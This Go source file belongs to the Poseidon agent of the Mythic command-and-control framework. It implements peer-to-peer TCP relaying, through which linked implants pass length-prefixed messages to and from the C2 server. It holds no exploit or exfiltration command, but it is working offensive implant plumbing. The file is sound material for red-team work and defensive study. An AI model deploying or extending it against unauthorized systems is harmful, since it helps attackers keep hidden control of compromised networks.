package p2p

import (
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/google/uuid"
	"net"
	"sync"
)

var (
	internalTCPConnections     = make(map[string]*net.Conn)
	internalTCPConnectionMutex sync.RWMutex
	internalTCPMapping         = make(map[string]string)
)

type poseidonTCP struct {
}

func (c poseidonTCP) ProfileName() string {
	return "poseidon_tcp"
}
func (c poseidonTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessage) {
	var err error = nil
	internalTCPConnectionMutex.Lock()
	if conn, ok := internalTCPConnections[delegate.UUID]; ok {
		if delegate.MythicUUID != "" && delegate.MythicUUID != delegate.UUID {
			// Mythic told us that our UUID was fake and gave the right one
			utils.PrintDebug(fmt.Sprintf("adding new MythicUUID: %s from %s\n", delegate.MythicUUID, delegate.UUID))
			internalTCPConnections[delegate.MythicUUID] = conn
			internalTCPMapping[delegate.UUID] = delegate.MythicUUID
			// remove our old one
			utils.PrintDebug(fmt.Sprintf("removing internal tcp connection for: %s\n", delegate.UUID))
			delete(internalTCPConnections, delegate.UUID)
		}
		utils.PrintDebug(fmt.Sprintf("Sending ingress data to P2P connection\n"))
		err = SendTCPData([]byte(delegate.Message), *conn)
	}
	internalTCPConnectionMutex.Unlock()
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send data to linked p2p connection, %v\n", err))
		go c.RemoveInternalConnection(delegate.UUID)
	}
}
func (c poseidonTCP) RemoveInternalConnection(connectionUUID string) bool {
	internalTCPConnectionMutex.Lock()
	defer internalTCPConnectionMutex.Unlock()
	if conn, ok := internalTCPConnections[connectionUUID]; ok {
		utils.PrintDebug(fmt.Sprintf("about to remove a connection, %s\n", connectionUUID))
		//printInternalTCPConnectionMap()
		(*conn).Close()
		delete(internalTCPConnections, connectionUUID)
		//fmt.Printf("connection removed, %s\n", connectionUUID)
		//utils.PrintDebug(c.GetInternalP2PMap())
		select {
		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
			ConnectionUUID: connectionUUID,
			C2ProfileName:  "poseidon_tcp",
		}:
		}
		return true
	} else if mythicUUID, ok := internalTCPMapping[connectionUUID]; ok {
		select {
		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
			ConnectionUUID: mythicUUID,
			C2ProfileName:  "poseidon_tcp",
		}:
		}
		return true
	} else {
		// we don't know about this connection we're asked to close
		return false
	}
}
func (c poseidonTCP) AddInternalConnection(connection interface{}) {
	//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
	connectionUUID := uuid.New().String()
	internalTCPConnectionMutex.Lock()
	defer internalTCPConnectionMutex.Unlock()

	newConnectionString := (*connection.(*net.Conn)).RemoteAddr().String()
	utils.PrintDebug(fmt.Sprintf("AddNewInternalConnectionChannel with UUID ( %s ) for %v\n", connectionUUID, newConnectionString))
	for _, v := range internalTCPConnections {
		if (*v).RemoteAddr().String() == newConnectionString {
			// we already have an existing connection to this IP:Port combination, close old one
			utils.PrintDebug("already have connection, closing old one")
			(*v).Close()
			break
		}
	}
	internalTCPConnections[connectionUUID] = connection.(*net.Conn)
	go c.readFromInternalTCPConnections(connection.(*net.Conn), connectionUUID)
}
func (c poseidonTCP) GetInternalP2PMap() string {
	output := "----- InternalTCPConnectionsMap ------\n"
	internalTCPConnectionMutex.RLock()
	defer internalTCPConnectionMutex.RUnlock()
	for k, v := range internalTCPConnections {
		output += fmt.Sprintf("UUID: %s, Connection: %s\n", k, (*v).RemoteAddr().String())
	}
	output += fmt.Sprintf("---- done -----\n")
	return output
}
func (c poseidonTCP) readFromInternalTCPConnections(newConnection *net.Conn, tempConnectionUUID string) {
	// read from the internal connections to pass back out to Mythic
	//fmt.Printf("readFromInternalTCPConnection started for %v\n", newConnection)
	//fmt.Printf("reading from newInternalTCPConnection: %s\n", tempConnectionUUID)
	var sizeBuffer uint32
	for {
		err := binary.Read(*newConnection, binary.BigEndian, &sizeBuffer)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to read size from tcp connection: %v\n", err))
			c.RemoveInternalConnection(tempConnectionUUID)
			return
		}
		if sizeBuffer > 0 {
			readBuffer := make([]byte, sizeBuffer)

			readSoFar, err := (*newConnection).Read(readBuffer)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to read bytes from tcp connection: %v\n", err))
				c.RemoveInternalConnection(tempConnectionUUID)
				return
			}
			totalRead := uint32(readSoFar)
			for totalRead < sizeBuffer {
				// we didn't read the full size of the message yet, read more
				nextBuffer := make([]byte, sizeBuffer-totalRead)
				readSoFar, err = (*newConnection).Read(nextBuffer)
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("Failed to read bytes from tcp connection: %v\n", err))
					c.RemoveInternalConnection(tempConnectionUUID)
					return
				}
				copy(readBuffer[totalRead:], nextBuffer)
				totalRead = totalRead + uint32(readSoFar)
			}
			//fmt.Printf("Read %d bytes from connection\n", totalRead)
			newDelegateMessage := structs.DelegateMessage{}
			newDelegateMessage.Message = string(readBuffer)
			newDelegateMessage.UUID = getInternalConnectionUUID(tempConnectionUUID)
			//fmt.Printf("converted %s to %s when sending message to Mythic\n", tempConnectionUUID, newDelegateMessage.UUID)
			newDelegateMessage.C2ProfileName = c.ProfileName()
			//fmt.Printf("Adding delegate message to channel: %v\n", newDelegateMessage)
			responses.NewDelegatesToMythicChannel <- newDelegateMessage
		} else {
			utils.PrintDebug(fmt.Sprintf("Read 0 bytes from internal TCP connection\n"))
			c.RemoveInternalConnection(tempConnectionUUID)
		}

	}
}
func init() {
	registerAvailableP2P(poseidonTCP{})
}

// SendWebshellData sends TCP P2P data in the proper format for poseidon_tcp connections
func SendTCPData(sendData []byte, conn net.Conn) error {
	err := binary.Write(conn, binary.BigEndian, int32(len(sendData)))
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send down pipe with error: %v\n", err))
		return err
	}
	totalWritten := 0
	for totalWritten < len(sendData) {
		currentWrites, err := conn.Write(sendData[totalWritten:])
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
			return err
		}
		totalWritten += currentWrites
		if totalWritten == 0 {
			return errors.New("failed to write to connection")
		}
	}

	utils.PrintDebug(fmt.Sprintf("Sent %d bytes to connection\n", totalWritten))
	return nil
}
